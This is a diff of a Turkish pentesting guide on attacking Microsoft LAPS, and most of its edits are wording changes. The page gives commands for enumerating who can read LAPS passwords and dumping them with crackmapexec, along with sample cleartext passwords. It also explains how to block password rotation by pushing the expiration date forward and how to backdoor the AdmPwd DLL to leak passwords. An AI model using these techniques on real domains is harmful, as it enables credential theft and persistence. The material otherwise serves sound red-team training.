@@ -5,9 +5,9 @@
 
 ## Temel Bilgiler
 
-Local Administrator Password Solution (LAPS), **yönetici şifreleri**nin **eşsiz, rastgele ve sık sık değiştirilen** bir şekilde alan adı ile bağlı bilgisayarlara uygulandığı bir sistemi yönetmek için kullanılan bir araçtır. Bu şifreler, Active Directory içinde güvenli bir şekilde saklanır ve yalnızca Erişim Kontrol Listeleri (ACL'ler) aracılığıyla izin verilmiş kullanıcılara erişilebilir. İstemciden sunucuya şifre iletimlerinin güvenliği, **Kerberos sürüm 5** ve **Gelişmiş Şifreleme Standardı (AES)** kullanılarak sağlanır.
+Local Administrator Password Solution (LAPS), **benzersiz, rastgele ve sık sık değiştirilen** **yönetici parolalarının** etki alanına bağlı bilgisayarlara uygulandığı bir sistemi yönetmek için kullanılan bir araçtır. Bu parolalar, Active Directory içinde güvenli bir şekilde saklanır ve yalnızca Erişim Kontrol Listeleri (ACL'ler) aracılığıyla izin verilmiş kullanıcılara erişilebilir. İstemciden sunucuya parolanın iletim güvenliği, **Kerberos sürüm 5** ve **Gelişmiş Şifreleme Standardı (AES)** kullanılarak sağlanır.
 
-Alan adının bilgisayar nesnelerinde, LAPS'ın uygulanması iki yeni niteliğin eklenmesiyle sonuçlanır: **`ms-mcs-AdmPwd`** ve **`ms-mcs-AdmPwdExpirationTime`**. Bu nitelikler, sırasıyla **düz metin yönetici şifresini** ve **şifrenin son kullanma tarihini** saklar.
+Etki alanının bilgisayar nesnelerinde, LAPS'ın uygulanması, iki yeni niteliğin eklenmesiyle sonuçlanır: **`ms-mcs-AdmPwd`** ve **`ms-mcs-AdmPwdExpirationTime`**. Bu nitelikler, sırasıyla **düz metin yönetici parolasını** ve **sona erme zamanını** saklar.
 
 ### Aktif olup olmadığını kontrol et
 ```bash
@@ -26,8 +26,8 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 
 Ham LAPS politikasını `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` adresinden **indirebilir** ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinden **`Parse-PolFile`** kullanılabilir.
 
-Ayrıca, erişim sağladığımız bir makinede yüklüyse **yerel LAPS PowerShell cmdlet'leri** de kullanılabilir:
-```powershell
+Ayrıca, erişim sağladığımız bir makinede yüklüyse **yerel LAPS PowerShell cmdlet'leri** kullanılabilir:
+```bash
 Get-Command *AdmPwd*
 
 CommandType     Name                                               Version    Source
@@ -48,7 +48,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
 **PowerView** ayrıca **şifrenin kimler tarafından okunabileceğini ve okunmasını** bulmak için de kullanılabilir:
-```powershell
+```bash
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 
@@ -58,9 +58,9 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 ### LAPSToolkit
 
 The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) LAPS'in birkaç işlevle sayımını kolaylaştırır.\
-Bunlardan biri, **LAPS etkin olan tüm bilgisayarlar için `ExtendedRights`'ı** ayrıştırmaktır. Bu, genellikle korunan gruplardaki kullanıcılar olan **LAPS şifrelerini okumak için özel olarak yetkilendirilmiş** **grupları** gösterecektir.\
+Bunlardan biri, **LAPS etkin olan tüm bilgisayarlar için `ExtendedRights`**'ı ayrıştırmaktır. Bu, genellikle korunan gruplardaki kullanıcılar olan **LAPS şifrelerini okumak için özel olarak yetkilendirilmiş** **grupları** gösterecektir.\
 Bir **hesap**, bir bilgisayarı bir domaine **katıldığında**, o ana bilgisayar üzerinde `All Extended Rights` alır ve bu hak, **hesaba** **şifreleri okuma** yeteneği verir. Sayım, bir ana bilgisayarda LAPS şifresini okuyabilen bir kullanıcı hesabını gösterebilir. Bu, LAPS şifrelerini okuyabilen **belirli AD kullanıcılarını hedeflememize** yardımcı olabilir.
-```powershell
+```bash
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
 
@@ -85,7 +85,7 @@ DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
 ## **Dumping LAPS Passwords With Crackmapexec**
 
-Eğer bir powershell erişiminiz yoksa, bunu LDAP kullanarak uzaktan bu yetkiyi kötüye kullanabilirsiniz.
+Eğer bir powershell erişiminiz yoksa, bu yetkiyi LDAP üzerinden uzaktan kötüye kullanabilirsiniz.
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
@@ -103,8 +103,8 @@ Password: 2Z@Ae)7!{9#Cq
 
 ### **Son Kullanma Tarihi**
 
-Bir kez yönetici olduğunuzda, **şifreleri elde etmek** ve bir makinenin **şifresini güncellemesini engellemek** için **son kullanma tarihini geleceğe ayarlamak** mümkündür.
-```powershell
+Bir yönetici olduğunda, **şifreleri elde etmek** ve bir makinenin **şifresini güncellemesini engellemek** için **son kullanma tarihini geleceğe ayarlamak** mümkündür.
+```bash
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 
@@ -117,9 +117,9 @@ Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="2326099
 
 ### Arka Kapı
 
-LAPS'ın orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle kodda (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` yönteminde) bir arka kapı koymak mümkündür; bu, bir şekilde **yeni şifreleri dışarı sızdıracak veya bir yere depolayacaktır**.
+LAPS'ın orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle kodda bir arka kapı koymak mümkündür (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` yönteminde) bu bir şekilde **yeni şifreleri dışarı sızdıracak veya bir yere kaydedecektir**.
 
-Sonra, yeni `AdmPwd.PS.dll` dosyasını derleyin ve bunu `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` konumundaki makineye yükleyin (ve değiştirme zamanını değiştirin).
+Sonra, yeni `AdmPwd.PS.dll` dosyasını derleyin ve bunu `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` konumuna yükleyin (ve değiştirme zamanını değiştirin).
 
 ## Referanslar
 
